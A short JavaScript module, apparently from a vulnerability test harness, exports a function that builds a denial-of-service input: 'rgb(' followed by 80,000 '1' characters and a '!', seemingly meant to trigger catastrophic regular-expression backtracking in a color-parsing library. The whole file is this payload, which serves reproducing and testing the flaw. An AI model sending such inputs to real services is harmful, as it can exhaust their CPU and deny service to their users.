function getPayload() {
    let attack_str = "rgb(" + "1".repeat(80000) + "!";
    return { attack_str };
}

module.exports = { getPayload };